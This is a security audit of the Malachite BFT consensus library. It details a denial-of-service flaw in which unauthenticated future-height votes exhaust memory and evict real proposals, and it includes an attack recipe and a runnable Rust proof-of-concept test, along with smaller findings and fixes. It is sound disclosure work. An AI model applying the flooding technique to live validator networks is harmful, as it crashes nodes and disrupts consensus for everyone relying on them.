# Malachite v0.8.1 Security Review

- **Target:** https://github.com/circlefin/malachite (reviewed at commit `f20bebd`, "chore: sync v0.8.1 to malachite")
- **Scope:** consensus core (`core-consensus`, `core-driver`, `core-state-machine`, `core-votekeeper`, `core-types`), engine actors (`engine`), value sync (`sync`), networking (`network`, `discovery`), WAL (`wal`), signing (`signing*`), reference test context and app (`test`).
- **Method:** manual source review of every consensus-critical path, followed by a runnable proof of concept against the real `State` and `process!` loop for the confirmed finding.

## Summary

| # | Title | Severity | Status |
|---|-------|----------|--------|
| 1 | Unauthenticated future-height inputs are retained before any validation (memory exhaustion + silent eviction of legitimate inputs) | **High** | Confirmed with PoC |
| 2 | Verifier `Err` on a vote-extension check aborts the consensus actor | Low–Medium (application dependent) | Confirmed by code reading |
| 3 | One validator key can prove many libp2p identities and evict non-validator peers | Info (documented in ADR-006) | Not new |
| 4 | `ProposalOnly` mode marks every proposal `Valid` without application validation | Info (documented in ADR-003) | Not new |
| 5 | Per-round proposal cap can drop the proposal a polka later forms on | Low (accepted design trade-off) | Not new |

---

## Finding 1 (High): unauthenticated future-height inputs are retained before any validation

### Root cause

Every vote, proposal and proposed value whose height is **above** the current consensus height is pushed into the consensus input queue before any check runs. Validator-set membership, signature verification, proposer check, the future-round lookahead and the vote-extension policy are all applied only when the queue is replayed at the start of that height. The queue (`BoundedQueue`) is bounded by **entry count only**, never by bytes.

| Location | What it does |
|---|---|
| `code/crates/core-consensus/src/handle/vote.rs:40-53` | Buffers any vote with `vote_height > consensus_height`. Signature verification only happens later, at line 117. |
| `code/crates/core-consensus/src/handle/proposal.rs:59-68` | Same for proposals. |
| `code/crates/core-consensus/src/handle/proposed_value.rs:85-96` | Same for proposed values. |
| `code/crates/core-consensus/src/state.rs:548-549` | `buffer_input` → `input_queue.push(height, input)`. |
| `code/crates/core-consensus/src/util/bounded_queue.rs:36-92` | `push` enforces `per_key_capacity` (count) and `capacity` (distinct heights). No byte accounting. |
| `code/crates/config/src/lib.rs:806-812` | Defaults: `queue_capacity = 10` heights, `queue_per_height_capacity = 500`. |
| `code/crates/config/src/lib.rs:171-172` | `pubsub_max_size = 4 MiB`; `pubsub_max_size_per_topic.consensus = None` (falls back to 4 MiB). |
| `code/crates/network/src/behaviour.rs:202` | Gossipsub uses `ValidationMode::Strict` (libp2p signature only). `validate_messages()` / `report_message_validation_result` are never used, so the engine never tells gossipsub a message is junk. |
| `code/crates/test/proto/consensus.proto` (`Vote.extension.data`, `Value.value`) | Wire fields of attacker-chosen size. |

### Reachability

- Attacker: any peer subscribed to the consensus (or liveness) gossipsub topic. **No validator key is required.**
- Payload: a `Vote` for `height + 1` from any address, with a random signature and an `extension` of up to ~4 MiB. A prevote carrying an extension is illegal and would be rejected at the current height (`verify_vote_extension`), but one height ahead it is stored verbatim.
- Varying `round`/`address`/`value` per message defeats gossipsub's content-hash dedup.
- Because the engine never reports validity back to gossipsub, every such message is **relayed to the entire mesh**, so one connection to one node reaches every node.

### Impact

1. **Memory exhaustion (availability, network-wide).** 500 entries × 4 MiB = **2 GiB per future height**; with 10 heights, **~20 GiB** of retained attacker data per node. Validators typically run with 4–16 GiB, so a single height's worth is enough to OOM-kill them. The data is held until the node reaches that height, then replayed (and only then rejected).
2. **Silent eviction of legitimate inputs (liveness).** Once a height's 500 slots are full, every later message for that height, including the real round-0 proposal and the votes of faster validators, is dropped with only a `debug!` log. Gossipsub does not redeliver, and proposals are not rebroadcast until hidden-lock round 10. Each affected node loses at least one round per height for as long as the flood continues.

### Proof of concept

Both tests pass against the real consensus `State` (`cargo test -p arc-malachitebft-core-consensus --test poc_future_height_buffer -- --nocapture`):

| Observation | Result |
|---|---|
| Unverified votes retained for height+1 | 500 of 600 sent; **0** `VerifySignature` effects; **0** `WalAppend` effects |
| Bytes retained at 1 MiB per vote (4 MiB allowed on the wire) | 500 MiB per height (2 GiB at wire max) |
| Distinct future heights retained | 10 heights, 5,000 entries |
| Legitimate round-0 proposal for height+1 arriving after the flood | Dropped silently; after moving to height+1 consensus has no full proposal for it |

Output:

```
retained 500 MiB of unverified attacker bytes for height 2 (500 entries)
test poc_unverified_future_height_votes_fill_buffer_and_evict_legit_proposal ... ok
test poc_ten_future_heights_are_all_retained ... ok
```

PoC source (drop into `code/crates/core-consensus/tests/poc_future_height_buffer.rs`):

```rust
//! PoC: unverified future-height inputs are buffered before any validation,
//! bounded only by count (500/height, 10 heights), not by bytes.
use std::cell::Cell;

use arc_malachitebft_core_consensus::{process, Effect, Error, Input, Params, Resumable, Resume, State};
use bytes::Bytes;
use malachitebft_core_types::{
    Context, NilOrVal, Round, SignedMessage, SignedProposal, SignedVote, ValuePayload, Vote as _,
};
use malachitebft_metrics::Metrics;
use malachitebft_test::utils::validators::make_validators;
use malachitebft_test::{
    Address, Height, Proposal, Signature, TestContext, Validator, ValidatorSet, Value, ValueId,
};

fn run(r: Result<(), Error<TestContext>>) {
    r.expect("consensus returned an error");
}

struct Counters {
    verify_signature: Cell<u32>,
    wal_append: Cell<u32>,
}

impl Counters {
    fn handle(&self, effect: Effect<TestContext>) -> Result<Resume<TestContext>, ()> {
        use Effect::*;
        Ok(match effect {
            VerifySignature(_, _, r) => {
                self.verify_signature.set(self.verify_signature.get() + 1);
                r.resume_with(true)
            }
            WalAppend(_, _, r) => {
                self.wal_append.set(self.wal_append.get() + 1);
                r.resume_with(())
            }
            _ => Resume::Continue,
        })
    }
}

#[test]
fn poc_unverified_future_height_votes_fill_buffer_and_evict_legit_proposal() {
    let entries: Vec<(Validator, _)> = make_validators([25, 25, 25, 25]).into();
    let validators: Vec<Validator> = entries.iter().map(|(v, _)| v.clone()).collect();
    let my_addr = validators[0].address;
    let vs = ValidatorSet::new(validators.clone());
    let ctx = TestContext::new();

    // Default config: queue_capacity = 10 heights, queue_per_height_capacity = 500
    let mut state = State::new(
        ctx.clone(),
        Height::new(1),
        vs.clone(),
        Params {
            address: my_addr,
            threshold_params: Default::default(),
            value_payload: ValuePayload::ProposalOnly,
            enabled: true,
        },
        10,
        500,
    );
    let metrics = Metrics::new();
    let counters = Counters { verify_signature: Cell::new(0), wal_append: Cell::new(0) };

    run(process!(
        input: Input::StartHeight(Height::new(1), vs.clone(), false, None, Default::default()),
        state: &mut state,
        metrics: &metrics,
        with: effect => counters.handle(effect)
    ));
    assert_eq!(state.height(), Height::new(1));
    assert_eq!(state.round(), Round::new(0));

    // Attacker: NOT a validator, garbage signature, 1 MiB "vote extension" on a
    // *prevote* (which is never legal), for height 2 (the next height).
    const EXT_LEN: usize = 1 << 20;
    let attacker = Address::new([0xEE; 20]);
    assert!(vs.get_by_address(&attacker).is_none());

    let mut retained_bytes = 0usize;
    for i in 0..600u32 {
        let ext = Bytes::from(vec![(i % 251) as u8; EXT_LEN]); // distinct allocation each time
        let vote = ctx
            .new_prevote(Height::new(2), Round::new(i), NilOrVal::Val(ValueId::new(1)), attacker)
            .extend(SignedMessage::new(ext, Signature::test()));
        let signed = SignedVote::new(vote, Signature::test());
        let before = state.input_queue.size();
        run(process!(
            input: Input::Vote(signed),
            state: &mut state,
            metrics: &metrics,
            with: effect => counters.handle(effect)
        ));
        if state.input_queue.size() > before {
            retained_bytes += EXT_LEN;
        }
    }

    // All 500 slots for height 2 hold attacker data; nothing was verified or logged.
    assert_eq!(state.input_queue.size(), 500);
    assert_eq!(counters.verify_signature.get(), 0, "no signature was ever checked");
    assert_eq!(counters.wal_append.get(), 0);
    eprintln!(
        "retained {} MiB of unverified attacker bytes for height 2 ({} entries)",
        retained_bytes >> 20,
        state.input_queue.size()
    );

    // Now the *legitimate* round-0 proposal for height 2 from its real proposer arrives
    // early (e.g. the proposer finished height 1 first). It is silently dropped.
    let proposer = state.get_proposer(Height::new(2), Round::new(0)).clone();
    let proposal = SignedProposal::new(
        Proposal::new(Height::new(2), Round::new(0), Value::new(42), Round::Nil, proposer),
        Signature::test(),
    );
    run(process!(
        input: Input::Proposal(proposal),
        state: &mut state,
        metrics: &metrics,
        with: effect => counters.handle(effect)
    ));
    assert_eq!(state.input_queue.size(), 500, "legit proposal for height 2 was not buffered");

    // Move to height 2 and drain: the pending inputs are 500 attacker votes, no proposal.
    run(process!(
        input: Input::StartHeight(Height::new(2), vs.clone(), false, None, Default::default()),
        state: &mut state,
        metrics: &metrics,
        with: effect => counters.handle(effect)
    ));
    assert_eq!(state.input_queue.size(), 0);
    assert!(
        state
            .full_proposal_at_round_and_value(&Height::new(2), Round::new(0), &Value::new(42))
            .is_none(),
        "consensus never saw the legit proposal for height 2 round 0"
    );
    assert_eq!(counters.wal_append.get(), 0, "none of the attacker votes survived verification");
}

/// Capacity is per distinct height: an attacker can hold 10 heights x 500 entries.
#[test]
fn poc_ten_future_heights_are_all_retained() {
    let entries: Vec<(Validator, _)> = make_validators([25, 25, 25, 25]).into();
    let validators: Vec<Validator> = entries.iter().map(|(v, _)| v.clone()).collect();
    let my_addr = validators[0].address;
    let vs = ValidatorSet::new(validators.clone());
    let ctx = TestContext::new();
    let mut state = State::new(
        ctx.clone(), Height::new(1), vs.clone(),
        Params { address: my_addr, threshold_params: Default::default(), value_payload: ValuePayload::ProposalOnly, enabled: true },
        10, 500,
    );
    let metrics = Metrics::new();
    let counters = Counters { verify_signature: Cell::new(0), wal_append: Cell::new(0) };
    run(process!(
        input: Input::StartHeight(Height::new(1), vs.clone(), false, None, Default::default()),
        state: &mut state, metrics: &metrics, with: effect => counters.handle(effect)
    ));
    let attacker = Address::new([0xEE; 20]);
    for h in 2..=11u64 {
        for i in 0..500u32 {
            let vote = ctx
                .new_prevote(Height::new(h), Round::new(i), NilOrVal::Val(ValueId::new(1)), attacker)
                .extend(SignedMessage::new(Bytes::from_static(&[0u8; 64]), Signature::test()));
            run(process!(
                input: Input::Vote(SignedVote::new(vote, Signature::test())),
                state: &mut state, metrics: &metrics, with: effect => counters.handle(effect)
            ));
        }
    }
    assert_eq!(state.input_queue.len(), 10);
    assert_eq!(state.input_queue.size(), 5000);
    assert_eq!(counters.verify_signature.get(), 0);
}
```

### Prior awareness

The commit that introduced the per-height cap (`aeb7e73`, "fix: add per-key capacity limit to BoundedQueue") states in its message: *"The per-key capacity limits the count of items, not their byte size … 10 heights × 500 inputs/height × 4 MiB/input = ~20 GiB. I think that is worth noticing."* The issue was noticed but left open. ADR-008 (`docs/architecture/adr-008-consensus-input-queue.md`) documents that "the queue can hold invalid messages from Byzantine peers" and lists **no negative consequences**. The eviction of legitimate inputs and the fact that no validator key is needed are not documented.

### Severity justification

High: remote, unauthenticated, cheap for the attacker, amplified by gossipsub relaying, and the consequence is network-wide validator crashes (OOM) plus liveness degradation. Not Critical because it does not break safety (no conflicting finalization) and operators can mitigate by configuration.

### Recommended fix

1. Add a **byte budget** to `BoundedQueue` (per height and global), accounting the encoded size of each `Input`.
2. Reject structurally illegal votes at decode or before buffering: prevotes and nil precommits with an extension, extensions above a configured maximum.
3. Require membership in the **current** validator set (and, where the next height's set is known, verify the signature) before buffering; treat the next height's set as the current one by default.
4. Cap buffered entries **per sender** (`from` peer) so one peer cannot fill a height.
5. Enable gossipsub `validate_messages()` and report `Reject` for undecodable/structurally invalid messages so they are not relayed and the sender is scored down.
6. Ship a small default for `pubsub_max_size_per_topic.consensus` (votes and proposals are tiny unless extensions/values are legitimately large).

---

## Finding 2 (Low–Medium, application dependent): verifier `Err` on a vote-extension check aborts the consensus actor

### Root cause

`code/crates/engine/src/consensus.rs:1421-1445` handles `Effect::VerifyVoteExtension` and uses `?` on `self.verifier.verify_signed_vote_extension(...)`. When an effect handler returns `Err`, the `process!` macro (`code/crates/core-consensus/src/macros.rs:27-33`) logs it and resumes the coroutine with `Resume::Continue`; `perform!` then fails with `Error::UnexpectedResume`, and the caller wraps the input in `stop_on_failure` (`code/crates/engine/src/util/failure.rs:26-38`), which terminates the consensus actor.

The adjacent `Effect::VerifySignature` handler (`consensus.rs:1310-1325`) deliberately maps `Err` to "invalid" with the comment: *"a gossip peer must not be able to do that."* The vote-extension path does not apply the same rule.

### Reachability

The extension check only runs after the vote's own signature verified (`handle/vote.rs:117` → `verify_signed_vote`), so the trigger is a **validator-signed** non-nil precommit whose extension makes the application's `Verifier::verify_signed_vote_extension` return `Err` rather than `Ok(Invalid)`. The shipped test verifier (`code/crates/test/src/signing.rs`) never returns `Err`, and neither `signing-ed25519` nor `signing-ecdsa` implements `Verifier`, so exposure depends on the deploying application's implementation (for example one that errors on malformed extension bytes).

### Impact

A Byzantine validator (within the f-fault budget) could crash every node whose verifier errors, by broadcasting one precommit. Severity is Low to Medium because it needs a validator key and an application-level verifier behaviour.

### Recommended fix

Mirror the `VerifySignature` handling: convert `Err` into `VoteExtensionError::InvalidSignature` (or `InvalidVoteExtension`) and resume normally instead of propagating.

---

## Documented or accepted limitations (not counted as new findings)

### 3. Multiple libp2p identities per validator key (ADR-006, "unmitigated")

`code/crates/network/src/state.rs:288-328` records a verified proof per **peer** with no dedup by consensus public key, and `try_prioritize_peer` (`state.rs:787-835`) promotes every validator-classified peer, evicting the lowest-scored non-validator inbound peer. A single Byzantine validator can mint many libp2p identities, each carrying a valid proof, and occupy all inbound slots of honest nodes. ADR-006's threat table lists "Multiple nodes per validator" as not mitigated ("wastes connection slots"). The practical effect can be stronger than stated (eclipse of full nodes and inability of later honest validators to be promoted), so the suggested fix in the ADR (limit connections per consensus key) is worth implementing.

### 4. `ProposalOnly` mode assigns `Validity::Valid` unconditionally (ADR-003, "in progress")

`code/crates/core-consensus/src/handle/proposal.rs:162-173` builds the `ProposedValue` with `validity: Validity::Valid` and a `TODO` to pass the value to the application. ADR-003 line 218 marks the application validation hook as "implementation in progress". Until then, any application using `ProposalOnly` has no `valid(v)` check at all, which Tendermint's safety argument relies on for external validity.

### 5. Per-round proposal cap drops late legitimate proposals (design trade-off)

`MAX_PROPOSALS_PER_ROUND = 2` (`code/crates/core-consensus/src/full_proposal.rs:14`) with the pre-gate in `handle/proposal.rs:~140-160`. A Byzantine proposer that sends two decoy values before the real one causes nodes that have not yet assembled the polka certificate to drop the real proposal (not redelivered by gossipsub). Nodes cannot act on the polka that then forms and precommit nil; the round is lost. Recovery happens through round certificates and the hidden-lock restream at round ≥ 10. Safety is unaffected.

---

## Areas reviewed and found sound

- **Vote/proposal admission:** validator-set membership and signature checks before any state change at the current height; proposer check against `select_proposer`; future-round lookahead bound; vote-extension policy enforcement (`handle/vote.rs`, `handle/proposal.rs`).
- **Votekeeper:** one vote per (validator, type, round); equivocation recorded as evidence and never tallied; thresholds computed with the validator set's weights; overflow-checked `is_met`.
- **Certificates:** commit/extended-commit/polka/round verifiers reject duplicates, unknown validators, invalid vote types, and use checked voting-power sums; polka certificates applied as a unit, round certificates vote-by-vote with absorption dedup.
- **State machine and driver:** L22/L28/L36/L49 guards match the pseudo-code (lock/valid handling, `pol_round < round`, L49 from any round, decision immutability); `SkipRound`/`PrecommitAny` certificate bookkeeping; pruning does not desynchronise votes and polka certificates.
- **Sync:** responses accepted only for outstanding requests, from the recorded peer, with contiguous heights; inbound requests rate-limited, per-peer capped and clamped to tip/batch; buffered values bounded by requested ranges; height arithmetic on peer-supplied values is saturating or guarded.
- **WAL:** every `PublishConsensusMsg`, `StartRound` and `Decide` is preceded by an fsync (`wal_flush`), so a vote is durable before it is broadcast; replay reuses the recorded signature and halts on divergence instead of re-signing.
- **Networking:** sync `Status` travels over the non-relaying broadcast transport so the sender check is sound; validator proofs are bound to the sender's peer id; connection and per-IP limits; discovery responses capped at 100 peers.
- **Actor error handling:** apart from Finding 2, every peer-reachable effect handler converts failures into resume values rather than propagating `Err`.
